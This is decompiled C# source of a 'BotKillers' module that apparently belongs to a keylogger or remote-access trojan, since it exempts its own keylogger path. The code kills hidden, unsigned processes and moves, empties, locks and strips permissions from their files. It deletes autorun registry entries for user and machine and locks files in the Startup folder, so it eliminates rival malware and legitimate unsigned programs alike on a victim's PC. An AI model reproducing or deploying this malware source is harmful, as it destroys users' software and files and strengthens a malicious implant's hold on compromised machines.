namespace Chat
{
    using Chat.My;
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.Win32;
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Security.AccessControl;
    using System.Security.Principal;
    using System.Windows.Forms;

    [StandardModule]
    internal sealed class BotKillers
    {
        private static bool IsAdmin = false;
        private static int ProccessKilled = 0;
        private static int Startupkilled = 0;

        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        public static void DestroyFile(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    Random random = new Random();
                    try
                    {
                        MyProject.Computer.FileSystem.MoveFile(path, Path.GetTempPath() + Conversions.ToString(random.Next(500, 0x2328)));
                        File.WriteAllText(path, string.Empty);
                        FileSystem.FileOpen(FileSystem.FreeFile(), path, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite, -1);
                        KillFile(path);
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        DirectoryInfo info = new DirectoryInfo(path);
                        DirectorySecurity directorySecurity = new DirectorySecurity();
                        directorySecurity.SetAccessRuleProtection(true, false);
                        info.SetAccessControl(directorySecurity);
                        ProjectData.ClearProjectError();
                    }
                }
            }
            catch (Exception exception2)
            {
                ProjectData.SetProjectError(exception2);
                ProjectData.ClearProjectError();
            }
        }

        [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        public static bool IsFileMalicious(string fileloc)
        {
            bool flag;
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                if (!fileloc.Contains(Application.ExecutablePath))
                {
                    goto Label_0028;
                }
            Label_001D:
                num3 = 3;
                flag = false;
                goto Label_0221;
            Label_0028:
                num3 = 5;
                if (!fileloc.Contains(SplitFunzioni.KeyloggherExePatch))
                {
                    goto Label_0047;
                }
            Label_003C:
                num3 = 6;
                flag = false;
                goto Label_0221;
            Label_0047:
                num3 = 8;
                if (!fileloc.Contains("cmd"))
                {
                    goto Label_0067;
                }
            Label_005B:
                num3 = 9;
                flag = true;
                goto Label_0221;
            Label_0067:
                num3 = 11;
                if (!fileloc.Contains("wscript"))
                {
                    goto Label_0088;
                }
            Label_007C:
                num3 = 12;
                flag = true;
                goto Label_0221;
            Label_0088:
                num3 = 14;
                if (!fileloc.Contains(RuntimeEnvironment.GetRuntimeDirectory()))
                {
                    goto Label_00A9;
                }
            Label_009D:
                num3 = 15;
                flag = true;
                goto Label_0221;
            Label_00A9:
                num3 = 0x11;
                if (!WinTrust.VerifyEmbeddedSignature(fileloc))
                {
                    goto Label_00C5;
                }
            Label_00B9:
                num3 = 0x12;
                flag = false;
                goto Label_0221;
            Label_00C5:
                num3 = 20;
                if (!(fileloc.Contains(Environment.GetEnvironmentVariable("USERPROFILE")) | fileloc.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))))
                {
                    goto Label_00F9;
                }
            Label_00ED:
                num3 = 0x15;
                flag = true;
                goto Label_0221;
            Label_00F9:
                num3 = 0x17;
                FileAttributes attributes = File.GetAttributes(fileloc);
            Label_0104:
                num3 = 0x18;
                if ((attributes & FileAttributes.System) != FileAttributes.System)
                {
                    goto Label_0120;
                }
            Label_0114:
                num3 = 0x19;
                flag = true;
                goto Label_0221;
            Label_0120:
                num3 = 0x1b;
                if ((attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
                {
                    goto Label_013C;
                }
            Label_0130:
                num3 = 0x1c;
                flag = true;
                goto Label_0221;
            Label_013C:
                num3 = 30;
                flag = false;
                goto Label_0221;
            Label_0152:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_001D;

                    case 4:
                    case 5:
                        goto Label_0028;

                    case 6:
                        goto Label_003C;

                    case 7:
                    case 8:
                        goto Label_0047;

                    case 9:
                        goto Label_005B;

                    case 10:
                    case 11:
                        goto Label_0067;

                    case 12:
                        goto Label_007C;

                    case 13:
                    case 14:
                        goto Label_0088;

                    case 15:
                        goto Label_009D;

                    case 0x10:
                    case 0x11:
                        goto Label_00A9;

                    case 0x12:
                        goto Label_00B9;

                    case 0x13:
                    case 20:
                        goto Label_00C5;

                    case 0x15:
                        goto Label_00ED;

                    case 0x16:
                    case 0x17:
                        goto Label_00F9;

                    case 0x18:
                        goto Label_0104;

                    case 0x19:
                        goto Label_0114;

                    case 0x1a:
                    case 0x1b:
                        goto Label_0120;

                    case 0x1c:
                        goto Label_0130;

                    case 0x1d:
                    case 30:
                        goto Label_013C;

                    case 0x1f:
                        goto Label_0221;

                    default:
                        goto Label_0216;
                }
            Label_01DB:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_0216;

                    case 1:
                        goto Label_0152;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_01DB;
            }
        Label_0216:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0221:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
            return flag;
        }

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", SetLastError=true)]
        private static extern bool IsWindowVisible(IntPtr hWnd);
        public static void KillFile(string location)
        {
            try
            {
                string path = location;
                DirectoryInfo info = new DirectoryInfo(path);
                DirectorySecurity directorySecurity = new DirectorySecurity();
                directorySecurity.SetAccessRuleProtection(true, false);
                info.SetAccessControl(directorySecurity);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void RemoveKey(int Reg, string file, string reglocation, string FileLocation)
        {
            try
            {
                string name = reglocation;
                RegistryKey key = null;
                if (Reg == 1)
                {
                    key = Registry.CurrentUser.OpenSubKey(name, true);
                }
                else
                {
                    key = Registry.LocalMachine.OpenSubKey(name, true);
                }
                using (key)
                {
                    if (key != null)
                    {
                        key.DeleteValue(file);
                    }
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static string RunStandardBotKiller()
        {
            string str2;
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_000A:
                num3 = 2;
                WindowsIdentity current = WindowsIdentity.GetCurrent();
            Label_0013:
                num3 = 3;
                WindowsPrincipal principal = new WindowsPrincipal(current);
            Label_001D:
                num3 = 4;
                IsAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            Label_0030:
                num3 = 5;
                ScanProcess();
            Label_0039:
                num3 = 6;
                RunStartupKiller();
            Label_0042:
                num3 = 7;
                string str = ProccessKilled.ToString() + "|S|" + Startupkilled.ToString();
            Label_0064:
                num3 = 8;
                ProccessKilled = 0;
            Label_006D:
                num3 = 9;
                Startupkilled = 0;
            Label_0077:
                num3 = 10;
                str2 = str;
                goto Label_0114;
            Label_008F:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_000A;

                    case 3:
                        goto Label_0013;

                    case 4:
                        goto Label_001D;

                    case 5:
                        goto Label_0030;

                    case 6:
                        goto Label_0039;

                    case 7:
                        goto Label_0042;

                    case 8:
                        goto Label_0064;

                    case 9:
                        goto Label_006D;

                    case 10:
                        goto Label_0077;

                    case 11:
                        goto Label_0114;

                    default:
                        goto Label_0109;
                }
            Label_00C9:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_0109;

                    case 1:
                        goto Label_008F;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_00C9;
            }
        Label_0109:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0114:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
            return str2;
        }

        public static void RunStartupKiller()
        {
            int num3;
            try
            {
                int num4;
            Label_0001:
                ProjectData.ClearProjectError();
                int num2 = -2;
            Label_000A:
                num4 = 2;
                StartupFucker(@"Software\Microsoft\Windows\CurrentVersion\Run\", 1);
            Label_0019:
                num4 = 3;
                StartupFucker(@"Software\Microsoft\Windows\CurrentVersion\RunOnce\", 1);
            Label_0028:
                num4 = 4;
                if (!IsAdmin)
                {
                    goto Label_0055;
                }
            Label_0036:
                num4 = 5;
                StartupFucker(@"Software\Microsoft\Windows\CurrentVersion\Run\", 2);
            Label_0045:
                num4 = 6;
                StartupFucker(@"Software\Microsoft\Windows\CurrentVersion\RunOnce\", 2);
            Label_0055:
                num4 = 8;
                string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            Label_0064:
                num4 = 9;
                string[] strArray2 = files;
                int index = 0;
                while (index < strArray2.Length)
                {
                    string location = strArray2[index];
                Label_0072:
                    num4 = 10;
                    KillFile(location);
                    index++;
                Label_0081:
                    num4 = 11;
                }
                goto Label_0128;
            Label_009F:
                num3 = 0;
                switch ((num3 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_000A;

                    case 3:
                        goto Label_0019;

                    case 4:
                        goto Label_0028;

                    case 5:
                        goto Label_0036;

                    case 6:
                        goto Label_0045;

                    case 7:
                    case 8:
                        goto Label_0055;

                    case 9:
                        goto Label_0064;

                    case 10:
                        goto Label_0072;

                    case 11:
                        goto Label_0081;

                    case 12:
                        goto Label_0128;

                    default:
                        goto Label_011D;
                }
            Label_00DD:
                num3 = num4;
                switch (((num2 > -2) ? num2 : 1))
                {
                    case 0:
                        goto Label_011D;

                    case 1:
                        goto Label_009F;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_00DD;
            }
        Label_011D:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0128:
            if (num3 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        public static void ScanProcess()
        {
            try
            {
                Process[] processes = Process.GetProcesses();
                int num2 = processes.Length - 1;
                for (int i = 0; i <= num2; i++)
                {
                    Process process = processes[i];
                    try
                    {
                        string fullPath = Path.GetFullPath(process.MainModule.FileName);
                        if (IsFileMalicious(fullPath) && !WindowIsVisible(process.MainWindowTitle))
                        {
                            try
                            {
                                process.Kill();
                            }
                            catch (Exception exception1)
                            {
                                ProjectData.SetProjectError(exception1);
                                ProjectData.ClearProjectError();
                            }
                            DestroyFile(fullPath);
                            ProccessKilled++;
                        }
                    }
                    catch (Exception exception2)
                    {
                        ProjectData.SetProjectError(exception2);
                        ProjectData.ClearProjectError();
                    }
                }
            }
            catch (Exception exception3)
            {
                ProjectData.SetProjectError(exception3);
                ProjectData.ClearProjectError();
            }
        }

        public static void StartupFucker(string regkey, int type)
        {
            try
            {
                RegistryKey key;
                if (type == 1)
                {
                    key = Registry.CurrentUser.OpenSubKey(regkey);
                }
                if (type == 2)
                {
                    key = Registry.LocalMachine.OpenSubKey(regkey);
                }
                foreach (string str in key.GetValueNames())
                {
                    try
                    {
                        string expression = key.GetValue(str).ToString();
                        if (expression.Contains("-"))
                        {
                            if (expression.Contains("\""))
                            {
                                expression.Replace("\"", string.Empty);
                            }
                            try
                            {
                                expression = Strings.Split(expression, " -", -1, CompareMethod.Binary)[0];
                            }
                            catch (Exception exception1)
                            {
                                ProjectData.SetProjectError(exception1);
                                ProjectData.ClearProjectError();
                            }
                        }
                        if (expression.Contains("\""))
                        {
                            expression = expression.Split(new char[] { '"' })[1];
                        }
                        if (!expression.Contains(Application.ExecutablePath))
                        {
                            RemoveKey(type, str, regkey, expression);
                            if (!WinTrust.VerifyEmbeddedSignature(expression))
                            {
                                Startupkilled++;
                                DestroyFile(expression);
                            }
                        }
                    }
                    catch (Exception exception2)
                    {
                        ProjectData.SetProjectError(exception2);
                        ProjectData.ClearProjectError();
                    }
                }
            }
            catch (Exception exception3)
            {
                ProjectData.SetProjectError(exception3);
                ProjectData.ClearProjectError();
            }
        }

        public static bool WindowIsVisible(string WinTitle)
        {
            bool flag;
            try
            {
                flag = IsWindowVisible(FindWindow(null, WinTitle));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                flag = false;
                ProjectData.ClearProjectError();
                return flag;
                ProjectData.ClearProjectError();
            }
            return flag;
        }

        public sealed class WinTrust
        {
            private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
            private const string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";

            private WinTrust()
            {
            }

            public static bool VerifyEmbeddedSignature(string fileName)
            {
                bool flag;
                try
                {
                    BotKillers.WinTrustData pWVTData = new BotKillers.WinTrustData(fileName);
                    Guid pgActionID = new Guid("{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}");
                    flag = WinVerifyTrust(INVALID_HANDLE_VALUE, pgActionID, pWVTData) == BotKillers.WinVerifyTrustResult.Success;
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    flag = false;
                    ProjectData.ClearProjectError();
                    return flag;
                    ProjectData.ClearProjectError();
                }
                return flag;
            }

            [DllImport("wintrust.dll", CharSet=CharSet.Unicode, ExactSpelling=true)]
            private static extern BotKillers.WinVerifyTrustResult WinVerifyTrust([In] IntPtr hwnd, [In, MarshalAs(UnmanagedType.LPStruct)] Guid pgActionID, [In] BotKillers.WinTrustData pWVTData);
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        public class WinTrustData
        {
            private int StructSize = Marshal.SizeOf(typeof(BotKillers.WinTrustData));
            private IntPtr PolicyCallbackData = IntPtr.Zero;
            private IntPtr SIPClientData = IntPtr.Zero;
            private BotKillers.WinTrustDataUIChoice UIChoice = BotKillers.WinTrustDataUIChoice.None;
            private BotKillers.WinTrustDataRevocationChecks RevocationChecks = BotKillers.WinTrustDataRevocationChecks.None;
            private BotKillers.WinTrustDataChoice UnionChoice = BotKillers.WinTrustDataChoice.File;
            private IntPtr FileInfoPtr;
            private BotKillers.WinTrustDataStateAction StateAction = BotKillers.WinTrustDataStateAction.Ignore;
            private IntPtr StateData = IntPtr.Zero;
            private string URLReference = null;
            private BotKillers.WinTrustDataProvFlags ProvFlags = BotKillers.WinTrustDataProvFlags.SaferFlag;
            private BotKillers.WinTrustDataUIContext UIContext = BotKillers.WinTrustDataUIContext.Execute;
            public WinTrustData(string _fileName)
            {
                BotKillers.WinTrustFileInfo structure = new BotKillers.WinTrustFileInfo(_fileName);
                this.FileInfoPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(BotKillers.WinTrustFileInfo)));
                Marshal.StructureToPtr(structure, this.FileInfoPtr, false);
            }

            ~WinTrustData()
            {
                Marshal.FreeCoTaskMem(this.FileInfoPtr);
            }
        }

        public enum WinTrustDataChoice : uint
        {
            Blob = 3,
            Catalog = 2,
            Certificate = 5,
            File = 1,
            Signer = 4
        }

        [Flags]
        public enum WinTrustDataProvFlags : uint
        {
            CacheOnlyUrlRetrieval = 0x1000,
            HashOnlyFlag = 0x200,
            LifetimeSigningFlag = 0x800,
            NoIe4ChainFlag = 2,
            NoPolicyUsageFlag = 4,
            RevocationCheckChain = 0x40,
            RevocationCheckChainExcludeRoot = 0x80,
            RevocationCheckEndCert = 0x20,
            RevocationCheckNone = 0x10,
            SaferFlag = 0x100,
            UseDefaultOsverCheck = 0x400,
            UseIe4TrustFlag = 1
        }

        public enum WinTrustDataRevocationChecks : uint
        {
            None = 0,
            WholeChain = 1
        }

        public enum WinTrustDataStateAction : uint
        {
            AutoCache = 3,
            AutoCacheFlush = 4,
            Close = 2,
            Ignore = 0,
            Verify = 1
        }

        public enum WinTrustDataUIChoice : uint
        {
            All = 1,
            NoBad = 3,
            NoGood = 4,
            None = 2
        }

        public enum WinTrustDataUIContext : uint
        {
            Execute = 0,
            Install = 1
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        public class WinTrustFileInfo
        {
            private int StructSize = Marshal.SizeOf(typeof(BotKillers.WinTrustFileInfo));
            private IntPtr pszFilePath;
            private IntPtr hFile = IntPtr.Zero;
            private IntPtr pgKnownSubject = IntPtr.Zero;
            public WinTrustFileInfo(string _filePath)
            {
                this.pszFilePath = Marshal.StringToCoTaskMemAuto(_filePath);
            }

            ~WinTrustFileInfo()
            {
                Marshal.FreeCoTaskMem(this.pszFilePath);
            }
        }

        public enum WinVerifyTrustResult
        {
            ActionUnknown = -2146762750,
            ProviderUnknown = -2146762751,
            SubjectFormUnknown = -2146762749,
            SubjectNotTrusted = -2146762748,
            Success = 0
        }
    }
}

